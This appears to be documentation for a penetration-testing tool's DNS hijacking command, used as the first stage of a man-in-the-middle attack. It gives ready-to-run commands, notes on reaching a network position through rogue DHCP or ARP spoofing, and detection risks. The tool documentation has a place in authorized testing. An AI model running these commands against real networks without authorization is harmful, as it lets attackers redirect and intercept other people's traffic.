# DNS Hijacking

> Redirect DNS queries to attacker-controlled IP addresses.

## Overview

DNS hijacking is the first step in a MITM attack. By controlling DNS resolution, you can redirect traffic intended for legitimate servers to your interception proxy.

## How It Works

```
Normal DNS Resolution:
  Client ──► DNS Server ──► target.com = 93.184.216.34

Hijacked DNS Resolution:
  Client ──► Our DNS ──► target.com = 10.0.0.5 (attacker)
```

The hijacking server intercepts DNS queries matching your target pattern and responds with your specified IP address. All other queries are forwarded to upstream DNS servers for normal resolution.

## Basic Usage

### Start DNS Hijacking Server

```bash
# Hijack all subdomains of target.com
rb mitm intercept dns --target "*.target.com" --hijack-ip 10.0.0.5

# With custom bind address (non-standard port for testing)
rb mitm intercept dns --target "*.target.com" --hijack-ip 10.0.0.5 \
  --dns-bind 0.0.0.0:5353

# Specify upstream DNS servers
rb mitm intercept dns --target "*.target.com" --hijack-ip 10.0.0.5 \
  --upstream 8.8.8.8 --upstream-fallback 1.1.1.1
```

### Target Patterns

The `--target` flag supports wildcard patterns:

| Pattern | Matches | Does NOT Match |
|---------|---------|----------------|
| `*.example.com` | `api.example.com`, `www.example.com` | `example.com` |
| `example.com` | `example.com` only | `api.example.com` |
| `*.*.example.com` | `a.b.example.com` | `api.example.com` |
| `api.*` | `api.example.com`, `api.test.io` | `www.example.com` |

## Command Reference

```bash
rb mitm intercept dns [FLAGS]
```

### Required Flags

| Flag | Description |
|------|-------------|
| `--target`, `-t` | Domain pattern to hijack (e.g., `*.target.com`) |
| `--hijack-ip` | IP address to return for hijacked queries |

### Optional Flags

| Flag | Default | Description |
|------|---------|-------------|
| `--dns-bind` | `0.0.0.0:53` | Address and port to bind DNS server |
| `--upstream`, `-u` | `8.8.8.8` | Primary upstream DNS server |
| `--upstream-fallback` | `1.1.1.1` | Fallback upstream DNS server |
| `--verbose`, `-v` | disabled | Enable verbose logging |

## Architecture

```
┌────────────────────────────────────────────────────────────┐
│                    DNS Hijacking Server                     │
├────────────────────────────────────────────────────────────┤
│                                                             │
│  ┌─────────────────┐                                        │
│  │  UDP Listener   │◄─── DNS Query (port 53)                │
│  │  (Port 53)      │                                        │
│  └────────┬────────┘                                        │
│           │                                                 │
│           ▼                                                 │
│  ┌─────────────────┐                                        │
│  │  Rule Matcher   │                                        │
│  │                 │                                        │
│  │  Rules:         │                                        │
│  │  • *.target.com │──► Match ──► Return hijacked IP        │
│  │  • api.test.io  │                                        │
│  └────────┬────────┘                                        │
│           │                                                 │
│           ▼ (No match)                                      │
│  ┌─────────────────┐                                        │
│  │ Upstream Proxy  │──► Forward to 8.8.8.8 ──► Real IP      │
│  └─────────────────┘                                        │
│                                                             │
└────────────────────────────────────────────────────────────┘
```

## Deployment Scenarios

### Scenario 1: Local Testing

For testing your own applications:

```bash
# Start on non-privileged port
rb mitm intercept dns --target "*.myapp.local" --hijack-ip 127.0.0.1 \
  --dns-bind 127.0.0.1:5353

# Configure application to use custom DNS
# Or add to /etc/resolv.conf: nameserver 127.0.0.1
```

### Scenario 2: Network Position (Authorized Pentest)

When you have network access and authorization:

```bash
# Run as root for port 53
sudo rb mitm intercept dns --target "*.corp.target.com" --hijack-ip 192.168.1.100

# Configure target to use your DNS:
# 1. DHCP: Set up rogue DHCP with your DNS
# 2. ARP: ARP spoof gateway and forward DNS
# 3. Manual: Modify target's /etc/resolv.conf
```

### Scenario 3: Combined with Proxy

For full MITM interception:

```bash
# This starts both DNS and proxy together
rb mitm intercept start --target "*.target.com" --proxy-ip 10.0.0.5

# Or run separately for more control:
# Terminal 1: DNS server
rb mitm intercept dns --target "*.target.com" --hijack-ip 10.0.0.5

# Terminal 2: MITM proxy
rb mitm intercept proxy --proxy-port 8080
```

## DNS Protocol Details

The DNS server implements RFC 1035 from scratch:

### Supported Record Types

| Type | Code | Description |
|------|------|-------------|
| A | 1 | IPv4 address (hijacked) |
| AAAA | 28 | IPv6 address (passthrough) |
| CNAME | 5 | Canonical name (passthrough) |
| MX | 15 | Mail exchanger (passthrough) |
| NS | 2 | Name server (passthrough) |
| TXT | 16 | Text record (passthrough) |

### Query Handling

1. **Receive UDP packet** on configured port
2. **Parse DNS query** (question section)
3. **Check rules** for matching domain pattern
4. **If match**: Craft response with hijacked IP
5. **If no match**: Forward to upstream DNS

### Response Format

```
DNS Response (Hijacked):
┌─────────────────────────────────────┐
│ Header                              │
│   ID: [query ID]                    │
│   Flags: 0x8180 (response, no error)│
│   Questions: 1                      │
│   Answers: 1                        │
├─────────────────────────────────────┤
│ Question                            │
│   Name: target.com                  │
│   Type: A (1)                       │
│   Class: IN (1)                     │
├─────────────────────────────────────┤
│ Answer                              │
│   Name: target.com                  │
│   Type: A (1)                       │
│   Class: IN (1)                     │
│   TTL: 300                          │
│   Data: 10.0.0.5 (hijacked)         │
└─────────────────────────────────────┘
```

## Logging Output

With `--verbose` enabled:

```
[DNS] Listening on 0.0.0.0:53
[DNS] Rule added: *.target.com → 10.0.0.5
[DNS] Query from 192.168.1.50: api.target.com (A)
[DNS] HIJACK: api.target.com → 10.0.0.5
[DNS] Query from 192.168.1.50: google.com (A)
[DNS] PASSTHROUGH: google.com → 8.8.8.8
```

## Security Considerations

### Port 53 Requirements

- Port 53 is privileged (requires root on Linux/macOS)
- Use `sudo` or capabilities: `setcap cap_net_bind_service=+ep ./rb`
- Or use non-standard port (`--dns-bind 0.0.0.0:5353`)

### Network Positioning

To receive DNS queries, you need one of:

1. **DHCP Control**: Rogue DHCP server advertising your DNS
2. **ARP Spoofing**: Intercept traffic to real DNS server
3. **Gateway Position**: Be the network gateway
4. **Manual Config**: Target configured to use your DNS

### Detection Risks

DNS hijacking may be detected by:

- DNS monitoring systems
- DNSSEC-enabled domains (validation fails)
- Certificate transparency logs (different certs)
- Network intrusion detection systems

## Troubleshooting

### Permission Denied on Port 53

```bash
# Option 1: Run as root
sudo rb mitm intercept dns --target "*.target.com" --hijack-ip 10.0.0.5

# Option 2: Use capabilities (Linux)
sudo setcap cap_net_bind_service=+ep /path/to/rb

# Option 3: Use non-standard port
rb mitm intercept dns --target "*.target.com" --hijack-ip 10.0.0.5 \
  --dns-bind 0.0.0.0:5353
```

### Target Not Resolving to Hijacked IP

1. **Check target is using your DNS**: `dig @your-ip target.com`
2. **Verify pattern matches**: Wildcard patterns are case-insensitive
3. **Check DNS cache**: Target may have cached the real IP
4. **Verify port**: Ensure nothing else is on port 53

### Upstream DNS Failures

```bash
# Test upstream connectivity
dig @8.8.8.8 google.com

# Use different upstream
rb mitm intercept dns --target "*.target.com" --hijack-ip 10.0.0.5 \
  --upstream 1.1.1.1 --upstream-fallback 9.9.9.9
```

## Examples

### Basic Hijacking

```bash
# Hijack single domain
rb mitm intercept dns --target "api.example.com" --hijack-ip 10.0.0.5

# Hijack all subdomains
rb mitm intercept dns --target "*.example.com" --hijack-ip 10.0.0.5

# Hijack multiple patterns (run multiple instances)
rb mitm intercept dns --target "*.corp.example.com" --hijack-ip 10.0.0.5 &
rb mitm intercept dns --target "*.dev.example.com" --hijack-ip 10.0.0.5 \
  --dns-bind 0.0.0.0:5354 &
```

### Testing Setup

```bash
# Start DNS server
rb mitm intercept dns --target "*.test.local" --hijack-ip 127.0.0.1 \
  --dns-bind 127.0.0.1:5353 &

# Test with dig
dig @127.0.0.1 -p 5353 api.test.local
# Expected: 127.0.0.1

dig @127.0.0.1 -p 5353 google.com
# Expected: Real Google IP (passthrough)
```

## Next Steps

- [TLS Interception](02-tls-interception.md) - Intercept HTTPS traffic
- [Full MITM Stack](05-scenarios.md#full-mitm-attack) - Complete attack setup
